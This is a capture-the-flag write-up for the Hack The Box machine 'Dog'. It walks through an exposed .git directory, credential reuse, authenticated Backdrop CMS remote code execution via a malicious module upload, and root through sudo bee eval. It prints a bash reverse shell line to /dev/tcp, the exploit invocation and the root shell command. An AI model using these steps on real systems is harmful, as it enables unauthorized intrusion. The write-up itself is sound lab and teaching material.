# **HackTheBox — Dog | Full Writeup**

> **Platform:** Hack The Box
>
> **Author:** k41r0s3
>
> **Difficulty:** Easy
>
> **Category:** Web / Linux
>
> **Date:** March 17, 2026

---

## TL;DR

Discovered an exposed `.git` directory on a Backdrop CMS site and used `git-dumper` to recover the full source code, which contained database credentials in `settings.php`. The password was reused for the CMS admin account. Used a public Backdrop RCE exploit to upload a malicious PHP module and land a shell as `www-data`. The same password was reused for a Linux user (`johncusack`), granting user access. Privilege escalation was achieved via `sudo bee eval` — the Backdrop CLI tool — which executes arbitrary PHP system commands as root.

---

## Attack Chain

```
[Recon]
  nmap → Port 22 (SSH), Port 80 (HTTP/Apache)
  Manual browsing → Backdrop CMS 1, dog.htb hostname
         │
         ▼
[Enumeration]
  /.git/ → Directory listing open (200)
  git-dumper → Full repo recovered (2873 paths)
  settings.php → Database credentials recovered
  files/config_*/active/update.settings.json → Username: tiffany
         │
         ▼
[Foothold]
  tiffany:**[REDACTED]** → Backdrop admin login (password reuse)
  rvizx/backdrop-rce → Malicious PHP module uploaded
  → Shell as www-data
         │
         ▼
[Lateral Movement]
  su johncusack → password reuse
         │
         ▼
[User Flag]
  /home/johncusack/user.txt → **[REDACTED]**
         │
         ▼
[Privesc]
  sudo -l → (ALL : ALL) ALL
  sudo bee eval 'system(bash)'
         │
         ▼
[Root Flag]
  /root/root.txt → **[REDACTED]**
```

---

## Table of Contents

1. [Enumeration](#enumeration)
2. [Web Reconnaissance](#web-reconnaissance)
3. [Git Repository Disclosure](#git-repository-disclosure)
4. [Foothold — CMS Admin & RCE](#foothold--cms-admin--rce)
5. [Lateral Movement — johncusack](#lateral-movement--johncusack)
6. [Privilege Escalation — Root via bee eval](#privilege-escalation--root-via-bee-eval)
7. [Key Takeaways](#key-takeaways)
8. [Tools Used](#tools-used)

---

## Enumeration

### Port Scan

```bash
nmap -sV 10.129.231.223
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

Added the hostname to `/etc/hosts` after discovering it during web recon:

```bash
echo "10.129.231.223 dog.htb" | sudo tee -a /etc/hosts
```

**Thought process:** Only two ports. SSH without credentials is rarely the entry point on easy boxes. The web application is the primary attack surface. Standard approach: enumerate web thoroughly before touching anything else.

---

## Web Reconnaissance

Browsing to `http://dog.htb` revealed a dog care blog. The page source confirmed the CMS:

```html
<meta name="Generator" content="Backdrop CMS 1 (https://backdropcms.org)" />
```

| Path | Content |
| --- | --- |
| `/` | Home page — 4 blog posts |
| `/?q=about` | Contact: `support@dog.htb` |
| `/?q=user/login` | CMS login form |
| `/?q=posts/dog-obesity` | Posted by `dogBackDropSystem` |

**Key finding:** The About page confirmed the hostname `dog.htb`. A valid username `dogBackDropSystem` was visible as the author of a blog post. The contact email `support@dog.htb` confirmed the domain.

**Thought process:** Before reaching for automated scanners, manually browse the application to understand its structure. CMS sites almost always have a `/user/login` endpoint and often expose usernames through content authorship. Noting `dogBackDropSystem` as a potential account is useful for credential attempts later.

---

## Git Repository Disclosure

Checking for a `.git` directory is a standard step on any web application:

```bash
curl -I http://10.129.231.223/.git/
# HTTP/1.1 200 OK
```

**Key finding:** The `.git` directory was accessible with Apache directory listing enabled — the entire git object store was browsable. Individual object files returned 403, but all directories returned 200.

Verified key git metadata before dumping:

```bash
curl http://10.129.231.223/.git/logs/HEAD
# 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> — commit (initial)

curl http://10.129.231.223/.git/COMMIT_EDITMSG
# todo: customize url aliases.
```

**Thought process:** The 403 on individual files is a common partial-protection misconfiguration. It looks secure but isn't — `git-dumper` works by crawling the directory listings (which return 200), enumerating all object hashes, downloading each object individually, and then running `git checkout` to reconstruct the working tree. The directory listing is all it needs.

### Dumping the Repository

```bash
pip install git-dumper
git-dumper http://10.129.231.223/.git/ /home/k41r0s3/hackthebox/machine/dog
```

```
[-] Testing http://10.129.231.223/.git/HEAD [200]
[-] Fetching .git recursively
...
[-] Running git checkout .
Updated 2873 paths from the index
```

**Key finding:** Full Backdrop CMS source recovered — 2873 files including all configuration.

### Extracting Credentials from settings.php

```bash
grep "database" settings.php
```

```
$database = 'mysql://root:**[REDACTED]**@127.0.0.1/backdrop';
```

**Key finding:** Plaintext database credentials stored in `settings.php`. The password was recovered.

### Discovering Username from Active Config

```bash
grep -r "tiffany" files/ --include="*.json"
```

```
./files/config_83dddd18.../active/update.settings.json: "tiffany@dog.htb"
```

**Thought process:** Backdrop CMS stores its runtime configuration as JSON files under `files/config_*/active/`. These files contain everything from mail settings to admin notification recipients. Grepping for email patterns across all JSON files is a reliable way to surface valid usernames — the update notification email is almost always set to an admin account.

Username confirmed: `tiffany`

---

## Foothold — CMS Admin & RCE

### CMS Login

Tried the recovered database password for the `tiffany` account at `/?q=user/login`:

```bash
curl -s -o /dev/null -w "%{http_code}" -X POST \
  'http://10.129.231.223/?q=user/login' \
  --data 'name=tiffany&pass=**[REDACTED]**&form_id=user_login&op=Log+in'
# 302
```

**Key finding:** HTTP 302 redirect to `/?q=admin/dashboard` confirmed successful login. The database password was reused for the CMS admin account.

**Thought process:** Credential reuse between database and application accounts is extremely common — especially when the same person set up both. Always try any recovered password against every available authentication surface before moving on.

### RCE via Module Upload

With admin access to Backdrop CMS, the module installer at `/?q=admin/installer/manual` accepts archive uploads. This is a well-known authenticated RCE vector — a malicious PHP module packaged as a valid Backdrop archive will be extracted and executed by the web server.

Used the public exploit by rvizx which automates the full chain:

```bash
git clone https://github.com/rvizx/backdrop-rce
cd backdrop-rce
python3 exploit.py http://dog.htb tiffany **[REDACTED]**
```

```
[>] logging in as user: 'tiffany'
[>] login successful
[>] enabling maintenance mode
[>] maintenance enabled
[>] payload archive: /tmp/bd_3h_swzwk/rvz38c7a6.tgz
[>] fetching installer form
[>] uploading payload (bulk empty)
[>] initial upload post complete
[>] batch id = 20; sending authorize 'do_nojs' and 'do'
[>] waiting for shell at: http://dog.htb/modules/rvz38c7a6/shell.php
[>] shell is live
[>] interactive shell – type 'exit' to quit
k41r0s3@dog.htb >
```

**Thought process:** The exploit works by enabling maintenance mode (which suppresses UI warnings), then uploading a tgz archive containing a valid Backdrop module structure — a `.info` file declaring the module metadata, and a `.module` PHP file containing the webshell. Backdrop's installer extracts the archive into the `modules/` directory, making the shell publicly accessible at a predictable URL.

Set up a listener and sent a reverse shell through the interactive prompt:

```bash
# Kali — start listener
nc -lvnp <PORT>
```

```bash
# In the exploit's interactive shell:
bash -c 'bash -i >& /dev/tcp/<YOUR_TUN0_IP>/<PORT> 0>&1'
```

Shell received as `www-data`.

---

## Lateral Movement — johncusack

From the `www-data` shell, enumerated home directories:

```bash
ls /home/
# johncusack
```

Tried the recovered database password:

```bash
su johncusack
# Password: **[REDACTED]**

whoami
# johncusack
```

**Key finding:** The database password was reused for the Linux system user `johncusack`.

```bash
cat /home/johncusack/user.txt
# **[REDACTED]**
```

---

## Privilege Escalation — Root via bee eval

Checked sudo permissions as `johncusack`:

```bash
sudo -l
```

```
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) ALL
```

**Key finding:** `johncusack` has completely unrestricted sudo — any command as any user.

**Thought process:** `(ALL : ALL) ALL` is the most permissive sudo configuration possible. The interesting approach here is the `bee` tool — the official Backdrop CMS CLI utility installed on this server. It has an `eval` subcommand that passes its argument to PHP's `eval()` function. Since PHP's `system()` can spawn shell commands, `sudo bee eval 'system(bash)'` runs `bash` as root directly. This is essentially `sudo php -r 'system(bash)'` — useful to know as a technique when `php` itself isn't in GTFOBins but a PHP-based CLI tool is installed.

```bash
sudo bee eval 'system(bash)'
```

```
root@dog:/var/www/html# whoami
root
```

```bash
cat /root/root.txt
# **[REDACTED]**
```

---

## Key Takeaways

**1. Always check for an exposed `.git` directory**
A `.git` directory with Apache directory listing enabled is one of the most impactful misconfigurations you'll encounter. It exposes the entire development history of the application including configuration files, credentials, and source code. Checking `/.git/` should be one of the first manual steps on any web target — automated scanners often miss it or flag it as low severity when it should be treated as critical.

**2. `git-dumper` recovers repositories even when direct file access is blocked**
The common misconception is that returning 403 on individual git objects provides adequate protection. It doesn't. `git-dumper` only needs the directory listing (which returns 200) to enumerate all object hashes, download them individually, and reconstruct the full working tree with `git checkout`. The only real fix is to block access to the entire `.git` directory, not just its files.

**3. Backdrop CMS stores database credentials in plaintext in `settings.php`**
Unlike Drupal (which uses `sites/default/settings.php`), Backdrop stores its database configuration in `settings.php` at the application root. This file contains a plaintext connection string including the database username and password. If the source code is accessible through any means — git exposure, backup files, misconfigured directories — these credentials are immediately readable.

**4. Active config JSON files are a goldmine for username enumeration**
Backdrop stores all runtime configuration as JSON files under `files/config_*/active/`. Files like `update.settings.json` and mail configuration files contain admin email addresses and usernames. When you have source access, always grep these files for email patterns — they reliably surface valid admin accounts not exposed through any web interface.

**5. Credential reuse across services is the force multiplier**
On this machine, one recovered password unlocked four different access points: the MySQL database, the Backdrop CMS admin panel, the Linux system user account, and effectively SSH. Whenever a password is recovered — from a config file, a database, a hash crack — the immediate next step should be to try it against every other authentication surface.

**6. Authenticated RCE via CMS module upload is a reliable technique**
Any CMS that allows admin users to install third-party modules, plugins, or themes is inherently providing a PHP code execution interface. Backdrop, Drupal, WordPress, Joomla — all share this attack surface. Once you have admin credentials on a CMS, checking for module/plugin/theme installation functionality should be an immediate priority.

**7. Look beyond GTFOBins — check installed application CLIs for sudo abuse**
The privesc on this box uses `bee`, the Backdrop CLI tool, rather than a binary listed in GTFOBins. Any tool that executes user-supplied code — `eval`, `exec`, `run`, `script` subcommands — becomes a root shell when combined with unrestricted sudo. After finding `(ALL:ALL) ALL`, enumerate installed tools in `/usr/local/bin`, `/opt`, and application directories.

---

## Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | Port scanning and service detection |
| `git-dumper` | Dump exposed `.git` repository via directory listing |
| `curl` | Manual web requests and login verification |
| `rvizx/backdrop-rce` | Authenticated Backdrop CMS RCE via module upload |
| `netcat` | Reverse shell listener |
| `su` | Lateral movement to johncusack |
| `sudo bee eval` | Privilege escalation to root via Backdrop CLI |

---

*Written by k41r0s3 | HackTheBox | Dog*
